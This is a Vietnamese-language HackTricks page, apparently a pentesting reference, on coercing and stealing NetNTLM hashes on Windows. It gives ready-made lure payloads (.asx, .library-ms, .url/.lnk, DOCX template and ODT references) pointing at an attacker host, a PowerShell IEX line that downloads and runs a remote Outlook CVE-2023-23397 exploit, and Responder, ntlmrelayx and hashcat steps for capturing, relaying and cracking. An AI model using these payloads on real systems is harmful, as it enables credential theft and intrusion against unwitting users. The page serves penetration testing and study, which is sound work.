# Những nơi có thể đánh cắp thông tin đăng nhập NTLM

{{#include ../../banners/hacktricks-training.md}}

**Xem tất cả ý tưởng tuyệt vời tại [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), từ việc tải một tệp Microsoft Word trực tuyến đến nguồn ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md và [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Share SMB có quyền ghi + mồi UNC được Explorer kích hoạt (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Nếu bạn có thể **ghi vào một share mà người dùng hoặc các tác vụ theo lịch duyệt bằng Explorer**, hãy thả vào đó các tệp có metadata trỏ đến UNC của bạn (ví dụ: `\\ATTACKER\share`). Việc hiển thị thư mục sẽ kích hoạt **xác thực SMB ngầm** và làm lộ **NetNTLMv2** đến listener của bạn.<sup>[[1]](#references)</sup>

1. **Tạo mồi** (hỗ trợ SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/v.v.)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Đặt chúng vào writable share** (bất kỳ thư mục nào nạn nhân mở):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Nghe và crack**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows có thể truy cập nhiều tệp cùng lúc; mọi thứ Explorer xem trước (`BROWSE TO FOLDER`) đều không cần nhấp.

### Danh sách phát Windows Media Player (.ASX/.WAX)

Nếu bạn có thể khiến mục tiêu mở hoặc xem trước danh sách phát Windows Media Player do bạn kiểm soát, bạn có thể leak Net‑NTLMv2 bằng cách trỏ mục phát đến một đường dẫn UNC. WMP sẽ cố tải nội dung media được tham chiếu qua SMB và tự động xác thực.<sup>[[3]](#references)[[4]](#references)</sup>

Payload ví dụ:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Quy trình thu thập và cracking:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### NTLM leak từ .library-ms nhúng trong ZIP (CVE-2025-24071/24055)

Windows Explorer xử lý không an toàn các tệp .library-ms khi chúng được mở trực tiếp bên trong kho lưu trữ ZIP. Nếu định nghĩa thư viện trỏ đến một đường dẫn UNC từ xa (ví dụ: \\attacker\share), chỉ cần duyệt/mở .library-ms bên trong ZIP là Explorer sẽ liệt kê UNC và gửi thông tin xác thực NTLM đến attacker. Kết quả là thu được NetNTLMv2, có thể crack offline hoặc có khả năng relay.<sup>[[2]](#references)</sup>

Tệp .library-ms tối giản trỏ đến UNC của attacker

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

Các bước thực hiện
- Tạo tệp .library-ms bằng XML ở trên (đặt IP/hostname của bạn).
- Nén tệp thành ZIP (trên Windows: Send to → Compressed (zipped) folder) rồi gửi ZIP cho mục tiêu.
- Chạy NTLM capture listener và chờ nạn nhân mở tệp .library-ms bên trong ZIP.


### Đường dẫn âm thanh nhắc lịch Outlook (CVE-2023-23397) – leak Net-NTLMv2 zero-click

Microsoft Outlook for Windows xử lý thuộc tính MAPI mở rộng PidLidReminderFileParameter trong các mục lịch. Nếu thuộc tính này trỏ đến đường dẫn UNC (ví dụ: \\attacker\share\alert.wav), Outlook sẽ kết nối đến SMB share khi lời nhắc được kích hoạt, làm lộ Net-NTLMv2 của người dùng mà không cần nhấp chuột. Lỗi này đã được vá vào ngày 14 tháng 3 năm 2023, nhưng vẫn rất đáng lưu ý đối với các hệ thống cũ/chưa được cập nhật và trong quá trình ứng phó sự cố lịch sử.<sup>[[5]](#references)</sup>

Khai thác nhanh bằng PowerShell (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Phía listener:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Ghi chú
- Nạn nhân chỉ cần mở Outlook for Windows khi lời nhắc được kích hoạt.
- Leak thu được Net‑NTLMv2, phù hợp để crack offline hoặc relay (không phải pass-the-hash).


### Leak NTLM zero-click dựa trên biểu tượng .LNK/.URL (CVE‑2025‑50154 – bypass CVE‑2025‑24054)

Windows Explorer tự động hiển thị biểu tượng shortcut. Nghiên cứu gần đây cho thấy ngay cả sau bản vá tháng 4 năm 2025 của Microsoft dành cho shortcut có biểu tượng UNC, vẫn có thể kích hoạt xác thực NTLM mà không cần nhấp chuột bằng cách lưu trữ đích shortcut trên đường dẫn UNC và giữ biểu tượng ở cục bộ (lỗ hổng bypass bản vá được gán mã CVE‑2025‑50154). Chỉ cần xem thư mục là Explorer sẽ truy xuất metadata từ đích từ xa, gửi NTLM đến máy chủ SMB của attacker.<sup>[[6]](#references)</sup>

Payload Internet Shortcut tối giản (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

Tạo payload Shortcut (.lnk) bằng PowerShell:

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Ý tưởng phát tán
- Đặt shortcut vào ZIP rồi dụ nạn nhân mở ZIP.
- Đặt shortcut trên share có quyền ghi mà nạn nhân sẽ mở.
- Đặt thêm các file mồi khác trong cùng thư mục để Explorer xem trước các mục đó.

### No-click .LNK leak NTLM qua đường dẫn icon ExtraData (CVE‑2026‑25185)

Windows tải metadata của `.lnk` khi **xem/xem trước** (render icon), không chỉ khi thực thi. CVE‑2026‑25185 cho thấy một đường xử lý trong đó các khối **ExtraData** khiến shell phân giải đường dẫn icon và truy cập filesystem **trong quá trình tải**, từ đó phát sinh NTLM gửi ra ngoài nếu đường dẫn là đường dẫn từ xa.

Các điều kiện kích hoạt chính (quan sát được trong `CShellLink::_LoadFromStream`):
- Thêm **DARWIN_PROPS** (`0xa0000006`) vào ExtraData (điều kiện để gọi routine cập nhật icon).
- Thêm **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) với **TargetUnicode** được điền.
- Loader mở rộng các biến môi trường trong `TargetUnicode` rồi gọi `PathFileExistsW` trên đường dẫn thu được.

Nếu `TargetUnicode` phân giải thành đường dẫn UNC (ví dụ: `\\attacker\share\icon.ico`), **chỉ cần xem một thư mục** có chứa shortcut là đủ khiến thông tin xác thực được gửi ra ngoài. Đường xử lý này cũng có thể bị kích hoạt bởi **indexing** và **AV scanning**, khiến đây trở thành bề mặt leak thực tế không cần nhấp.<sup>[[7]](#references)</sup>

Có sẵn công cụ nghiên cứu (parser/generator/UI) trong dự án **LnkMeMaybe** để tạo/kiểm tra các cấu trúc này mà không cần dùng Windows GUI.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / xác thực credential qua `davclnt.dll,DavSetCookie`

**WebDAV client** gốc có thể bị lợi dụng để buộc phiên đăng nhập hiện tại xác thực với một endpoint **HTTP/WebDAV** bất kỳ:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Vì sao cách này hữu ích:
- Với **WebDAV server do attacker kiểm soát**, cách này có thể kích hoạt **NTLM over HTTP** mà không cần triển khai client tùy chỉnh.
- Với **host nội bộ**, đây là cách kín đáo để **xác thực nơi nào chấp nhận credentials bị đánh cắp** trước khi lateral movement.<sup>[[9]](#references)</sup>
- Lệnh này là một lựa chọn thay thế tốt khi **SMB egress bị lọc** nhưng **HTTP/WebDAV** vẫn truy cập được.

Lưu ý khi vận hành:
- Dịch vụ **WebClient** phải đang chạy trên host nguồn.
- `rundll32.exe` tải `davclnt.dll` và để Windows xử lý xác thực WebDAV bằng **credentials của người dùng hiện tại**.<sup>[[10]](#references)</sup>
- Nếu trỏ đến hạ tầng do bạn kiểm soát, hãy dùng HTTP listener/relay có hỗ trợ NTLM như:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Từ góc độ phát hiện, việc `rundll32.exe davclnt.dll,DavSetCookie` liên tục thực thi trên nhiều hệ thống nội bộ là dấu hiệu rõ ràng của **việc kiểm tra thông tin xác thực / chuẩn bị di chuyển ngang kiểu spray**, chứ không phải hành vi người dùng thông thường.<sup>[[9]](#references)[[11]](#references)</sup>

### URI thông báo từ xa để ép xác thực NTLM qua WebDAV

Nếu một ứng dụng truy cập các địa chỉ popup hoặc web-view được cấu hình từ xa, địa chỉ `file://` có thể ép xác thực gửi đi **mà không cần mở tài liệu hay payload thực thi**. Trong trường hợp AOMEI, thông báo một pixel trỏ đến đường dẫn WebDAV `DavWWWRoot` từ xa. Windows đã thử xác thực tích hợp với địa chỉ đó, làm lộ phản hồi challenge-response NetNTLMv2. Kích hoạt đến từ việc truy cập URI, không phải do popup hiển thị; cách này vẫn phụ thuộc vào trình xử lý URI của ứng dụng, [hành vi Windows WebClient](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) và chính sách xác thực gửi đi.<sup>[[16]](#references)</sup>

```ini
[PopWindow1]
Address="file://<ATTACKER_IP>/DavWWWRoot/campaign/24hour-flash-sale.html"
Width=1
Height=1
Priority=9999
```

Khác với kỹ thuật ép xác thực dựa trên lệnh ở trên, điểm vào này đòi hỏi quyền kiểm soát [cấu hình thông báo phần mềm](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Cửa sổ một pixel và độ ưu tiên cao cho thấy một thông báo không gây chú ý vẫn có thể khiến client truy xuất tham chiếu URI.<sup>[[16]](#references)</sup>

### Office remote template injection (.docx/.dotm) để ép NTLM

Tài liệu Office có thể tham chiếu đến một template bên ngoài. Nếu đặt template đính kèm thành đường dẫn UNC, việc mở tài liệu sẽ xác thực với SMB.

Các thay đổi tối thiểu đối với relationship của DOCX (bên trong word/):

1) Chỉnh sửa word/settings.xml và thêm tham chiếu đến template đính kèm:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) Chỉnh sửa word/_rels/settings.xml.rels và trỏ rId1337 đến UNC của bạn:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) Đóng gói lại thành .docx và gửi đi. Chạy SMB capture listener của bạn và chờ tài liệu được mở.

### Đối tượng external trong ODT để xác thực SMB

Khi một quy trình tải tài liệu lên chấp nhận `.odt` nhưng mục tiêu không mở tệp Office `.docx`, hãy dùng đối tượng external của OpenDocument thay cho Office template. Metasploit's `auxiliary/fileformat/odt_badodt` tạo ODT có `content.xml` chứa tham chiếu `draw:object` khi mở, như ví dụ bên dưới. Đặt `LHOST` thành SMB listener, tải ODT lên theo quy trình được phép và capture phản hồi NetNTLMv2 gửi ra ngoài khi người dùng hoặc bộ xử lý tài liệu mở tệp. Kiểm tra phần mở rộng tên tệp không kiểm tra URL được nhúng này; các hạn chế NTLM inbound trên mục tiêu không nhất thiết ngăn được việc xác thực outbound.<sup>[[15]](#references)</sup>

```xml
<draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
```

Để xem các ý tưởng sau khi thu thập thông tin xác thực về việc relaying hoặc lạm dụng NTLM, hãy xem:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Mồi nhử bằng share có quyền ghi + Responder capture → crack NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – leak xác thực qua ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 lên DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP làm lộ NTLM → NTFS junction đến webroot để RCE → FullPowers + GodPotato lên SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 lỗ hổng NTLM: Các mối đe dọa leo thang đặc quyền chưa được vá trong Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft giảm thiểu lỗ hổng EoP trong Outlook (CVE‑2023‑23397) và giải thích việc làm lộ NTLM qua PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Không cần tương tác, chỉ một NTLM: Vượt qua bản vá bảo mật của Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: Đánh giá CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Công cụ LnkMeMaybe của TrustedSec](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Khi bộ phận IT Support gọi đến: Phân tích chiến dịch ModeloRAT từ Teams đến xâm phạm Domain](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – tệp header davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Yêu cầu WebDAV từ Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Các vị trí cần chú ý để đánh cắp hash NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [15] [HTB: Hercules — Thu thập NTLM qua đối tượng bên ngoài trong ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
- [16] [Google Threat Intelligence Group và Mandiant – Điều tra hành vi can thiệp nhất thời vào chuỗi cung ứng](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
